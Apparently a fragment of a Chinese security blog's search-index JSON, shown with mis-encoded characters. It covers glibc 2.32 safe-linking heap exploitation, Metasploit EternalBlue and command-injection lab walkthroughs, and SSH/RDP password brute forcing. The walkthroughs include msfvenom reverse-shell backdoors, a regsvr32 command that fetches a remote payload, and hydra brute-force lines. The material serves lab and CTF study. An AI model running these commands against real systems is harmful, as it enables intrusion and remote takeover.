++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    if (__glibc_unlikely (!aligned_OK (e)))\n        malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n    tcache->entries[tc_idx] = REVEAL_PTR (e->next);\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n\n```\n\n##### Fastbinä¸­\n\n```c\nif (SINGLE_THREAD_P)\n{\n    /* Check that the top of the bin is not the record we are going to\n   add (i.e., double free).  */\n    if (__builtin_expect (old == p, 0))\n        malloc_printerr (\"double free or corruption (fasttop)\");\n    p->fd = PROTECT_PTR (&p->fd, old);\n    *fb = p;\n}\nelse\n    do\n    {\n        /* Check that the top of the bin is not the record we are going to\n     add (i.e., double free).  */\n        if (__builtin_expect (old == p, 0))\n            malloc_printerr (\"double free or corruption (fasttop)\");\n        old2 = old;\n        p->fd = PROTECT_PTR (&p->fd, old);\n    }\nwhile ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))\n       != old2);\n```\n\nå†åŠ ä¸Šå…¶ä»–\n\n```c\np->fd = PROTECT_PTR (&p->fd, old);\n//----------------------------------------\np = REVEAL_PTR (p->fd);\n//----------------------------------------\ntcache_tmp->entries[i] = REVEAL_PTR (e->next);\n//----------------------------------------\n*fb = REVEAL_PTR (victim->fd);\n//----------------------------------------\n*fb = REVEAL_PTR (tc_victim->fd);\n//----------------------------------------\ntmp = REVEAL_PTR (tmp->next))\n//----------------------------------------\nnextp = REVEAL_PTR (p->fd);\n```\n\n```c\n#define REMOVE_FB(fb, victim, pp)\t\t\t\\\ndo\t\t\t\t\t\t\t\\\n{\t\t\t\t\t\t\t\\\n\tvictim = pp;\t\t\t\t\t\\\n\tif (victim == NULL)\t\t\t\t\\\n\tbreak;\t\t\t\t\t\t\\\n\tpp = REVEAL_PTR (victim->fd);                                     \\\n\tif (__glibc_unlikely (pp != NULL && misaligned_chunk (pp)))       \\\n\tmalloc_printerr (\"malloc(): unaligned fastbin chunk detected\"); \\\n}\t\t\t\t\t\t\t\\\nwhile ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \\\n\t != victim);\t\t\t\t\t\\\n```\n\nç­‰å¤šå¤šå°‘å°‘ç”¨åˆ°tcacheå’Œfastbinçš„åœ°æ–¹ã€‚è€Œunsortebinã€largebinã€smallbinéƒ½ä¸ä¼šè¿›è¡Œç›¸å…³æŒ‡é’ˆå¼‚æˆ–ã€‚\n\n### (2)æ–°å¢æœºåˆ¶Safe-linkingçš„æ¼æ´\n\n#### â‘ è§„å¾‹æ€§\n\nå®˜æ–¹è¯´çš„æ˜¯\n\n```\n/* Safe-Linking:\nUse randomness from ASLR (mmap_base) to protect single-linked lists\nof Fast-Bins and TCache.  That is, mask the \"next\" pointers of the\nlists' chunks, and also perform allocation alignment checks on them.\nThis mechanism reduces the risk of pointer hijacking, as was done with\nSafe-Unlinking in the double-linked lists of Small-Bins.\nIt assumes a minimum page size of 4096 bytes (12 bits).  Systems with\nlarger pages provide less entropy, although the pointer mangling\nstill works.  */\n```\n\nåŸºäºASLRä¹‹åçš„å †åœ°å€ï¼Œå³Keyå€¼ä¸ºç¬¬ä¸€ä¸ªè¿›å…¥è¯¥å¤§å°TcacheBiné“¾çš„chunkçš„åœ°å€å³ç§»12bitå¾—åˆ°ï¼Œå¯¹äºFastbinä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚\n\n![Snipaste_2021-08-25_19-54-16](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210826213422.png)\n\n#### â‘¡ç‰¹æ®Šæ€§\n\nè™½è¯´FDè¢«åŠ å¯†ï¼Œä½†æ˜¯ç”±äºæ˜¯å¼‚æˆ–çš„å…³ç³»ï¼Œåœ¨UAFçš„ç‰¹æ®Šæ¡ä»¶ä¸‹å…¶å®æ˜¯å¯ä»¥æ§åˆ¶FDæŒ‡å‘å…¶ä»–å †å—çš„ã€‚\n\næ¯”å¦‚è¯´æˆ‘ä»¬è¿›è¡Œä¸€å®šçš„å †å¸ƒå±€ï¼Œå°è¯•å°†å †å—é›†ä¸­åœ¨0x100å†…ï¼Œç„¶åå¯ä»¥çˆ†ç ´1ä¸ªå­—èŠ‚æ¥è¿›è¡Œè®¡ç®—ï¼š\n\n![Snipaste_2021-08-25_17-50-30](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20210826213439.png)\n\nè¿™é‡Œå°±chunk4->chunk3->chunk2->chunk1ã€‚\n\nè¿™é‡Œå°±å‡è®¾æˆ‘ä»¬çˆ†ç ´1å­—èŠ‚åå·²ç»çŸ¥é“äº†heapbase/0x1000å·¦ç§»12bitçš„æœ€åä¸€ä¸ªå­—èŠ‚ä¸º0x59ã€‚ç°åœ¨è¿›è¡Œè®¡ç®—ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬æƒ³æŠŠchunk4çš„FDæŒ‡å‘chunk1åœ¨æ²¡æœ‰Leakçš„æƒ…å†µä¸‹åº”è¯¥æ€ä¹ˆä¿®æ”¹ï¼Ÿ\n\nè®¡ç®—0x10^0x59=0x49ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬åˆ©ç”¨UAFéƒ¨åˆ†å†™chunk4çš„FDçš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º0x49ï¼Œé‚£ä¹ˆå®é™…ä¸Šå…¶å®æŒ‡å‘çš„å°±æ˜¯chunk1ã€‚è¿™ä¸ªåœ¨æ²¡æœ‰æ³„éœ²åœ°å€è€ŒSizeåˆåšé™åˆ¶å¯¼è‡´åªèƒ½ç”¨Fastbinå’ŒTcacheæ—¶ï¼Œå¯ä»¥é‡‡ç”¨è¿™ç§æ–¹æ³•çˆ†ç ´ã€‚æ‰€ä»¥å®é™…ä¸Šçš„æœŸæœ›åº”è¯¥æ˜¯1/256ï¼Œè¿™ä¸ªå°è¯•ä¸€ä¸‹åº”è¯¥å°±å¯ä»¥å®ç°çš„ã€‚\n\n### (3)æ–°å¢Tcacheåœ°å€å¯¹é½æ£€æŸ¥\n\n#### â‘ tcache_getä¸­\n\n```c\n//2.32\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    if (__glibc_unlikely (!aligned_OK (e)))\n        malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n    tcache->entries[tc_idx] = REVEAL_PTR (e->next);\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n\n//2.31\ntcache_get (size_t tc_idx)\n{\n    tcache_entry *e = tcache->entries[tc_idx];\n    tcache->entries[tc_idx] = e->next;\n    --(tcache->counts[tc_idx]);\n    e->key = NULL;\n    return (void *) e;\n}\n```\n\nå¯ä»¥çœ‹åˆ°åœ¨tcache_getä¸­æ–°å¢äº†ä¸€ä¸ªæ£€æŸ¥\n\n```C\nif (__glibc_unlikely (!aligned_OK (e)))\n    malloc_printerr (\"malloc(): unaligned tcache chunk detected\");\n```\n\nè¿™ä¸ªå¯¼è‡´äº†æˆ‘ä»¬çš„tcacheä¸èƒ½ä»»æ„ç”³è¯·äº†ï¼Œ**å¿…é¡»æ˜¯0x10å¯¹é½çš„**ï¼Œè¿™ä¸ªå¯èƒ½ä¼šå¯¼è‡´ä¸å°‘çš„æ‰‹æ®µå˜åŒ–ã€‚\n\n#### â‘¡tcacheç»“æ„é‡Šæ”¾å‡½æ•°ä¸­\n\n```c\ntcache_thread_shutdown (void)\n{\n    int i;\n    tcache_perthread_struct *tcache_tmp = tcache;\n\n    if (!tcache)\n        return;\n\n    /* Disable the tcache and prevent it from being reinitialized.  */\n    tcache = NULL;\n    tcache_shutting_down = true;\n\n    /* Free all of the entries and the tcache itself back to the arena\n     heap for coalescing.  */\n    for (i = 0; i < TCACHE_MAX_BINS; ++i)\n    {\n        while (tcache_tmp->entries[i])\n        {\n            tcache_entry *e = tcache_tmp->entries[i];\n            if (__glibc_unlikely (!aligned_OK (e)))\n                malloc_printerr (\"tcache_thread_shutdown(): \"\n                                 \"unaligned tcache chunk detected\");\n            tcache_tmp->entries[i] = REVEAL_PTR (e->next);\n            __libc_free (e);\n        }\n    }\n\n    __libc_free (tcache_tmp);\n}\n```\n\n```c\nif (__glibc_unlikely (!aligned_OK (e)))\n    malloc_printerr (\"tcache_thread_shutdown(): \"\n                     \"unaligned tcache chunk detected\");\n```\n\nå³å½“ç¨‹åºé€€å‡ºï¼Œé‡Šæ”¾tcacheç»“æ„ä½“æ—¶ä¼šåŠ å…¥å¯¹tcacheä¸­æ‰€æœ‰chunkè¿›è¡Œåœ°å€å¯¹é½æ£€æŸ¥ï¼Œä½†æ˜¯è¿™ä¸ªå¯¹exit()çš„æ”»å‡»æ²¡ä»€ä¹ˆå½±å“ã€‚\n\n#### â‘¢Tcacheä¸­double freeæ£€æŸ¥ä¸­\n\n```c\nif (__glibc_unlikely (e->key == tcache))\n{\n    tcache_entry *tmp;\n    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);\n    for (tmp = tcache->entries[tc_idx];\n         tmp;\n         tmp = REVEAL_PTR (tmp->next))\n    {\n        if (__glibc_unlikely (!aligned_OK (tmp)))\n            malloc_printerr (\"free(): unaligned chunk detected in tcache 2\");\n        if (tmp == e)\n            malloc_printerr (\"free(): double free detected in tcache 2\");\n        /* If we get here, it was a coincidence.  We've wasted a\n\t   few cycles, but don't abort.  */\n    }\n}\n```\n\n```c\nif (__glibc_unlikely (!aligned_OK (tmp)))\n    malloc_printerr (\"free(): unaligned chunk detected in tcache 2\");\n```\n\nå½“tcacheè¿›è¡ŒFreeçš„double freeæ£€æŸ¥æ—¶ï¼Œå¦‚æœtcacheä¸­ç¬¬ä¸€ä¸ªbinçš„chunkåœ°å€ä¸å¯¹é½ï¼Œä¹Ÿä¼šé”™è¯¯ã€‚å…¶å®æœ€å¼€å§‹ä¸å¤ªç†è§£ï¼Œæƒ³è¿™èƒ½æœ‰å•¥ç”¨ï¼Œæœ€å¼€å§‹Freeçš„æ—¶å€™ä¸å°±å·²ç»è¿›è¡Œåœ°å€å¯¹é½æ£€æŸ¥äº†å—ã€‚åé¢æƒ³åˆ°ç”±äºstashingæœºåˆ¶ï¼Œå¯èƒ½ä¼šå°†åœ°å€ä¸åˆæ³•çš„Chunkæ”¾å…¥åˆ°tcacheä¸­ï¼Œæ‰€ä»¥å†è¿›è¡Œå¯¹åº”Binå¤§å°çš„chunké‡Šæ”¾æ—¶ï¼Œè¿›è¡Œæ£€æŸ¥æé«˜å®‰å…¨æ€§å§ã€‚**è¿™ä¸ªæˆ‘ä»¬åœ¨åˆ©ç”¨çš„æ—¶å€™ä¹Ÿéœ€è¦æ³¨æ„ä¸‹ï¼Œåˆ«åˆ°æ—¶å€™å¾—åˆ°äº†ç”¨Stashingæœºåˆ¶æ”¾å…¥ä¸€ä¸ªä¸åˆæ³•chunkä¹‹åå†freeå¯¼è‡´ç¨‹åºå‡ºé”™äº†ã€‚**\n\næƒ³æ„Ÿå¹ä¸€ä¸‹ï¼Œåœ¨2.31åŠä»¥ä¸‹ç‰ˆæœ¬ï¼Œåªæœ‰åœ¨_int_freeå‡½æ•°ä¸­æ‰æœ‰ä¸€ä¸ªåœ°å€å¯¹é½æ£€æŸ¥ï¼Œè¿™2.32çªç„¶åŠ äº†å¥½å‡ ä¸ªï¼ŒçœŸæ˜¯æŒºçŒ›çš„ã€‚\n\n\n\n## 2.UAFå¸¸è§é™åˆ¶\n\n### (1)UAF+Leak+Sizeä¸åšé™åˆ¶:\n\nè¿™ä¸ªå¦‚ä¸Šå›¾ä¸­å°±å¯ä»¥ç›´æ¥leakå‡ºchunk1çš„å†…å®¹å¾—åˆ°keyï¼Œç„¶åé‡Šæ”¾unsortedbin chunkæ³„éœ²libcåœ°å€åï¼Œåˆ©ç”¨keyå¼‚æˆ–å¯¹åº”åœ°å€å³å¯ä»»æ„ç”³è¯·ã€‚\n\n### (2)UAF+Leak+Sizeåšé™åˆ¶:\n\nä¸€æ ·çš„ï¼ŒLeakå‡ºkeyä¹‹åï¼Œä¿®æ”¹sizeå¾—åˆ°unsortedbin chunkä¹‹åæ³„éœ²libcåœ°å€ï¼Œå¼‚æˆ–æ”¹æ‰FDä»»æ„ç”³è¯·chunkã€‚\n\n### (3)UAF+æ— Leak+Sizeåšé™åˆ¶:\n\nè¿™æ¡ä»¶ä¸‹çš„æƒ³åŠå¤©å®åœ¨æ²¡æƒ³å‡ºæ¥ï¼Œçˆ†ç ´ä¸¤ä¸ªå­—èŠ‚å€’æ˜¯å¯ä»¥ç”³è¯·åˆ°Tcacheç»“æ„ä½“ï¼Œä½†æ˜¯ä¸¤ä¸ªå­—èŠ‚çš„æœŸæœ›å´è¾¾åˆ°äº†0xffff=65535ï¼Œå®é™…çš„çº¿ä¸ŠCTFä¸­å¯èƒ½çˆ†å‡ºæ¥é»„èŠ±èœéƒ½å‡‰äº†ã€‚\n\nâ–²çˆ†ç ´ä¸¤å­—èŠ‚ç”³è¯·Tcache Structï¼š\n\næ¯”å¦‚æˆ‘ä»¬å…ˆçˆ†ç ´ä¸€ä¸ªå­—èŠ‚ï¼Œä½¿å¾—heapbaseçš„åœ°å€ä¸º0xabcde5500000\n\nç„¶åæˆ‘ä»¬æŒ‰ç…§ä¸Šè¿°æ–¹æ³•ï¼Œç”¨ä¸€å®šå †å¸ƒå±€ï¼Œè®¡ç®—ä¸€ä¸‹åœ°å€\n\nå¼‚æˆ–ä¹‹åçš„åœ°å€åº”è¯¥ä¸ºï¼š\n\n```c\nchunk1:\t\t\t\t0xabcde5500400 ^ 0xabcde5500 = 0x--(0x0400^0x5500)\nTcacheStruct:\t\t0xabcde5500000 ^ 0xabcde5500 = 0x--(0x0000^0x5500)\n```\n\né‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¯¥æŒ‡å‘chunk1åœ°å€çš„æœ€åä¸¤ä¸ªå­—èŠ‚ä¸º5500å³å¯æŒ‡å‘Tcacheç»“æ„ä½“ï¼Œç„¶åé‡Šæ”¾è¿›å…¥unsortedbinè¸©ä¸‹libcåœ°å€å†çˆ†ç ´ç”³è¯·stdoutæ³„éœ²åœ°å€ï¼Œè¿™æ ·åˆä¼šå‡ºæ¥åŠä¸ªå­—èŠ‚çˆ†ç ´ç©ºé—´ã€‚å³0xfffff=1048575ï¼Œç›´æ¥GGã€‚\n\nâ–²sizeåšé™åˆ¶å…¶å®æ²¡å·®åˆ«ï¼Œå¯ä»¥çˆ†ç ´ä¸€ä¸ªå­—èŠ‚æ¥ä¿®æ”¹çš„ã€‚\n\n\n\n# æ€»ç»“\n\nè¿™æ¬¡æ€»ç»“å †åˆ©ç”¨æ–¹æ³•è®©æˆ‘ä¹Ÿå­¦åˆ°äº†å¥½å¤šï¼Œç¿»äº†å¥½å¤šæºç ï¼Œå¾ˆå¤šä»¥å‰ä¸æ˜æ‰€ä»¥çš„ä¸œè¥¿ç¿»äº†ç›¸å…³æºç ä¹‹åæ„Ÿè§‰ä¸€ä¸‹å­å°±æ¸…æ¥šäº†ã€‚\n\nè¿™ç¯‡æ–‡ç« æŒç»­æ›´æ–°ï¼Œä»¥åå†å‘ç°æœ‰æ„æ€çš„åœ°æ–¹å†å›æ¥æ›´æ–°ã€‚\n\nå½“ç„¶ï¼ŒUAFå…¶å®æ˜¯ç‰¹åˆ«å¥½åˆ©ç”¨çš„ä¸€ç§ï¼Œé«˜ç‰ˆæœ¬ä¸‹ä¹Ÿå¯¹åº”æœ‰å¾ˆå¤šçš„éªšæ“ä½œï¼Œæ¯”å¦‚\n\n`house of pig` :[house of pigä¸€ä¸ªæ–°çš„å †åˆ©ç”¨è¯¦è§£ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/242640)\n\n`house of banana` :[house of banana - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/222948)\n\nç­‰ç­‰ç°åœ¨å¤§å¤šçš„é¢˜ç›®éƒ½æ˜¯off by null + å †å¸ƒå±€ï¼Œå°¤å…¶æ˜¯å †å¸ƒå±€è¿™ä¸€å—ï¼Œå®åœ¨æ˜¯æ— æ¯”è€ƒéªŒå¯¹å †çš„ç†è§£ï¼Œå› ä¸ºä¸‡ä¸€å…¶ä¸­å“ªä¸ªåœ°æ–¹æƒ³é”™ï¼Œç›´æ¥å°±å¾—æ¨å€’é‡æ¥ã€‚\n\nåé¢æ‰¾æ—¶é—´å†æ€»ç»“ä¸‹off by nullå§ã€‚\n\n","tags":["Heap"],"categories":["PWN","pwnå †-UAF"]},{"title":"1.metasploit-win7æ°¸æ’ä¹‹è“-ms17_010å¤ç°","url":"/2021/08/19/1.metasploit-win7æ°¸æ’ä¹‹è“-ms17_010å¤ç°/","content":"\nå¼€äº†é˜²ç«å¢™çš„è¯å¯èƒ½éƒ½pingä¸é€šï¼Œéœ€è¦å„ç§ç»•è¿‡\n\nä¸€ã€å‰æœŸå·¥ä½œï¼š\n\n1.é¦–å…ˆä¿¡æ¯æ”¶é›†ï¼Œè·å–çœŸå®IPï¼Œç„¶åæ‰«æï¼Œå¾ˆå¤šç§ï¼Œå‚æ•°å¤ªå¤šï¼š\n\nnmap -O -p445 ipï¼šæ£€æŸ¥æ˜¯å¦å¼€å¯445ç«¯å£åŠä¸»æœºæ“ä½œç³»ç»Ÿ\n\ndb_nmap -sT -T4 ipï¼šå¿«é€Ÿæ‰«æï¼Œdbæ˜¯database\n\n2.ç„¶åçœ‹æœ‰æ²¡æœ‰æ¼æ´ï¼Œéœ€è¦å¯¹æ¼æ´æœ‰ä¸€å®šæŒæ¡\n\n3.åœ¨metasploitä¸‹æŸ¥æ‰¾æ¼æ´çš„ä½¿ç”¨æ¨¡å—å’Œæ‰«ææ¨¡å—ç­‰ï¼Œä¸‹é¢åˆ©ç”¨win7çš„æ°¸æ’ä¹‹è“æ¼æ´ï¼š\n\nsearch ms17_011ï¼šæŸ¥æ‰¾è¯¥æ¼æ´çš„ç›¸å…³\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191510199.png)\n\n4.å…ˆä½¿ç”¨è¯¥æ¨¡å—æ‰«æçœ‹çœ‹æœ‰æ²¡æœ‰è¯¥æ¼æ´ï¼š\n\n(1)è¿›å…¥æ¨¡å—å¹¶ä¸”é…ç½®æ¨¡å—ä¿¡æ¯ï¼š\n\nuse auxiliary/scanner/smb/smb_ms17_010\n\nshow options\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509941.png)\n\nset RHOSTS ip\n\n(2)ä½¿ç”¨è¯¥æ¨¡å—æ¥æ‰«æï¼š\n\nrunæˆ–è€…exploit\n\n \n\næ£€æµ‹åˆ°å¯èƒ½æœ‰ï¼Œé‚£ä¹ˆä½¿ç”¨æ”»å‡»æ¨¡å—ï¼š\n\n5.ä½¿ç”¨æ”»å‡»æ¨¡å—è¿›è¡Œæ”»å‡»ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509097.png)\n\nset RHOSTS ip\n\nexploit\n\n6.å¾—åˆ°ç›®çš„ä¸»æœºçš„shellï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509506.png)\n\n7.ä¸ºäº†ä¸ä¹±ç ï¼Œè®¾ç½®ç¼–ç æ ¼å¼ä¸ºutf-8ï¼š\n\nchcp 65001\n\n8.è°ƒæ¢è‡³åå°ï¼Œè¾“å…¥sessionså¯ä»¥æŸ¥çœ‹ï¼Œsessions idå¯ä»¥è¿›å…¥ï¼š\n\nbackground\n\nsessions\n\nsessions id\n\n9.ä¸ºäº†æ›´å¥½åˆ©ç”¨ï¼Œè°ƒæ¢è‡³meterpreteræ¨¡å¼ï¼š\n\nsessions -u 1\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191509822.png)\n\n \n\n \n\näºŒã€ç”Ÿæˆåé—¨ç¨‹åºä¼ åˆ°åœ¨ç›®æ ‡æœºå™¨ä¸Šï¼Œè¿™æ ·ä¸‹å›ç›®æ ‡æœºå™¨è¿è¡Œè¯¥ç¨‹åºï¼Œä¸»æœºç›‘å¬åˆ°ä¹‹åå°±å¯ä»¥ç›´æ¥è¿›å…¥äº†ï¼Œä¸ç®¡æ¼æ´åœ¨ä¸åœ¨ã€‚\n\n1.ç”Ÿæˆåé—¨ç¨‹åºï¼š\n\nâ‘ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f exe > localmsf8881.exe\n\nâ‘¡msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f raw > localmsf8881.py\n\nâ‘¢msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.80.158 lport=8881 -f raw > localmsf8881.php\n\nå¯ä»¥ç”Ÿæˆå¾ˆå¤šç§åé—¨ç¨‹åºï¼Œåªè¦åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨\n\n2.æœ¬æœºä¸Šä½¿ç”¨æ¨¡å—ï¼Œè®¾ç½®payloadå’Œç›‘å¬ç«¯å£ï¼š\n\nuse exploit/multi/handler\n\nset payload windows/meterpreter/reverse_tcp\n\nset LHOST 192.168.80.158\n\nset LPORT 8881\n\nrun\n\n3.ç°åœ¨å¦‚æœé¶æœºä¸Šè¿è¡Œlocalmsf8881ï¼Œå°±ä¼šä¼ å›ä¿¡æ¯ç»™ä¸»æœºï¼Œä¸»æœºä¸Šçš„è¿™ä¸ªå‘½ä»¤è¡Œå°±ä¼šå¾—åˆ°ä¸€ä¸ªmeterpreterçš„sessionï¼Œä¹‹åå°±å¯ä»¥è¿›å…¥äº†\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191510616.png)\n","tags":["WEB"],"categories":["WEB"]},{"title":"2.metasploit-éƒ¨åˆ†å‘½ä»¤æ‰§è¡Œè·å–æƒé™","url":"/2021/08/19/2.metasploit-éƒ¨åˆ†å‘½ä»¤æ‰§è¡Œè·å–æƒé™/","content":"\nä¸€ã€å‰æœŸè¿è¡Œï¼šwebä¸­ï¼Œå½“å¯ä»¥è¾“å…¥æŸäº›æŸ¥è¯¢æ¡†æ—¶ï¼Œè¯¥è¾“å…¥ä¼šè¢«è¿è¡Œåœ¨å‘½ä»¤è¡Œä¸­ï¼Œä¾‹å¦‚pingå‘½ä»¤ã€‚(DVWA)\n\n1.webè¦æ±‚è¾“å…¥ipåœ°å€ï¼Œç»æ£€æŸ¥å¯ä»¥å‘ç°è¾“å…¥çš„å†…å®¹ä¼šè¢«å®Œæ•´è¿è¡Œåˆ°æœåŠ¡å™¨çš„å‘½ä»¤è¡Œä¸‹ã€‚\n\nä¾‹å¦‚è¾“å…¥127.0.0.1 && whoamiï¼Œwebåé¦ˆçš„ä¿¡æ¯é™¤äº†ping 127.0.0.1ï¼Œè¿˜ä¼šå°†whoamiè¿™ä¸ªå‘½ä»¤çš„ä¿¡æ¯ç»™è¿”å›ã€‚\n\n2.åœ¨Msfconsleä¸­ä½¿ç”¨web_delivreryæ¨¡å—use exploit/multi/script/web_deliveryï¼Œä¹‹åè®¾ç½®å¯¹åº”å‚æ•°ï¼š\n\n(1)è®¾ç½®targetï¼Œéœ€è¦ç›®æ ‡æœåŠ¡å™¨ä¸Šæœ‰å¯¹åº”è„šæœ¬è¯­è¨€ï¼Œä½¿å¾—ç›®æ ‡æœåŠ¡å™¨ä¸Šèƒ½å¤Ÿè¿è¡Œæˆ‘ä»¬æ³¨å…¥çš„å‘½ä»¤ï¼Œæ‰“ä¸åŠ¨å°±ä»£è¡¨æ²¡æœ‰ï¼Œæˆ–è€…æ²¡æœ‰å†™å…¥ç¯å¢ƒå˜é‡ç­‰ç­‰åŸå› ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506647.png)\n\nè¿™é‡Œé€‰æ‹©ç›®æ ‡è¯­è¨€ä¸ºRegsvr32\n\n(2)æŸ¥çœ‹è¿˜éœ€è¦çš„é…ç½®ï¼Œé…ç½®ä¸€ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505056.png)\n\nè¿™é‡Œçš„lhostå°±æ˜¯æ”»å‡»æ–¹çš„ip\n\n(3)è®¾ç½®æ”»å‡»è½½è·ï¼Œç”Ÿæˆæ³¨å…¥å‘½ä»¤ï¼š\n\nset payload windows/meterpreter/reverse_tcp  (ä½¿ç”¨windowsçš„meterpreterï¼Œå»ºç«‹è¿æ¥reverse_tcp)\n\nç„¶åå°±ä¼šç”Ÿæˆå‘½ä»¤ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191505298.png)\n\nè¿™å°±ä»£è¡¨æˆ‘ä»¬éœ€è¦è¿›è¡Œå‘½ä»¤æ³¨å…¥ï¼Œåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼š\n\nregsvr32 /s /n /u /i:http://192.168.80.159:8080/IVJqvpIJSzu.sct scrobj.dll\n\næ­¤æ—¶msfconsoleå°±ä¼šè¿›å…¥åœæ»çŠ¶æ€ï¼Œä¸€æ—¦æ£€æŸ¥åˆ°æœ‰ç›®æ ‡æœåŠ¡å™¨è¿è¡Œäº†ä¸Šè¿°å‘½ä»¤ï¼Œå°±ä¼šç”Ÿæˆmeterpreterè¿æ¥ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191506787.png)\n\næ‰“ä¸é€šå¯èƒ½æ˜¯é˜²ç«å¢™æˆ–è€…æ€æ¯’è½¯ä»¶ä¹‹ç±»çš„å…³ç³»\n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"3.å¼±å£ä»¤å¯†ç ç ´è§£ç™»å½•","url":"/2021/08/19/3.å¼±å£ä»¤å¯†ç ç ´è§£ç™»å½•/","content":"\n1.åˆ¶ä½œå­—å…¸ï¼š\n\n(1)åˆ©ç”¨cewlåˆ¶ä½œï¼š\n\ncewl -d 2 -m 5 -w word.txt [www.baidu.com](http://www.baidu.com)\n\n(d:deepthï¼Œçˆ¬å–å±‚æ•°\n\nm:....æ€§èƒ½ï¼Œè®¾ç½®è¶Šå¤§çˆ¬å–è¶Šå¿«)\n\n(2)åˆ©ç”¨å·¥å…·åˆ¶ä½œï¼š\n\nhttp://www.bugku.com/mima/ è¾“å…¥ç›¸åº”ä¿¡æ¯å³å¯ç”Ÿæˆ\n\n(3)åˆ©ç”¨githubä¸Šçš„å·¥å…·ï¼š\n\nhttps://github.com/TheKingOfDuck/fuzzDicts\n\nhttps://github.com/fuzzdb-project/fuzzdb\n\nâ–²ç”Ÿæˆçš„å­—å…¸å¯èƒ½æœ‰ä¸­æ–‡ï¼Œä½¿ç”¨%s/\\v[^\\x00-\\xff]+//gæ¥å¼ºåˆ¶åˆ é™¤ä¸­æ–‡[^\\x00-\\xff]å³ä¸­æ–‡çš„è¡¨ç¤ºï¼ŒåŒå­—èŠ‚å­—ç¬¦\n\n \n\n2.åˆ©ç”¨å­—å…¸çˆ†ç ´SSH/RDP:\n\n(1)å…ˆæ‰«ææ˜¯å¦å¼€å¯äº†sshç«¯å£ï¼š\n\nnmap -sT -T4 ipï¼šå¿«é€Ÿæ‰«æ\n\n(1)ä½¿ç”¨hydra:\n\nå‚æ•°è®¾ç½®:\n\n-l(Login)ï¼šæƒ³è¦ç ´è§£çš„ç”¨æˆ·ï¼Œä¾‹å¦‚root\n\n-L(FILE)ï¼šæŒ‡å®šç”¨æˆ·åå­—å…¸\n\n-p(pass)ï¼šæŒ‡å®šå¯†ç ï¼Œå¦‚æœæœ‰å¯†ç è¿˜çˆ†ç ´å¹²å•¥\n\n-P(FILE)ï¼šæŒ‡å®šå¯†ç å­—å…¸\n\n-s(PORT)ï¼šæŒ‡å®šçˆ†ç ´ç«¯å£\n\n-M(FILE)ï¼šæŒ‡å®šç›®æ ‡åˆ—è¡¨æ–‡ä»¶ï¼Œå¦‚æœæœ‰å¤šä¸ªIPç›®æ ‡éœ€è¦æ”»å‡»ï¼Œå¯ç”¨æ¥æŒ‡å®š\n\n-C(FILE)ï¼š\n\n-f ï¼šä½¿ç”¨-Må‚æ•°åï¼Œæ‰¾åˆ°ç¬¬ä¸€ç™»å½•åå’Œå¯†ç å³ç»ˆæ­¢\n\nâ–²hydra -l root -p root 127.0.0.1 -s 2222 ssh -fï¼šç”¨rootå¯†ç ç™»å½•rooté€šè¿‡ssh\n\nâ–²hydra -l root -P word.txt 127.0.0.1 -s 2222 -f ssh\n\nâ–²hydra -l administrator -P word.txt 127.0.0.1 rdp(ç±»ä¼¼windowsä¸‹çš„ssh)\n\nâ˜…å¯ä»¥ä½¿ç”¨kaliè‡ªå¸¦çš„å¯†ç å­—å…¸å°è¯•ï¼š\n\nç›®å½•åœ¨/usr/share/wordlists/metasploit/ä¸‹ï¼Œæœ‰å¾ˆå¤šå­—å…¸å¯†ç \n\n(2)ä½¿ç”¨msfæ”»å‡»\n\nâ‘ æœç´¢ä¸€ä¸‹ï¼šsearch login //loginç­‰ç­‰\n\nâ‘¡é€šè¿‡æŸ¥æ‰¾åˆ°çš„ä½¿ç”¨è¯¥æ¨¡å—ï¼šuse auxiliary/scanner/ssh/ssh_login\n\nâ‘¢show optionsçœ‹ä¸€ä¸‹éœ€è¦è®¾ç½®ä»€ä¹ˆä¿¡æ¯ï¼Œè®¾ç½®ipï¼Œç”¨æˆ·åï¼Œå¯†ç 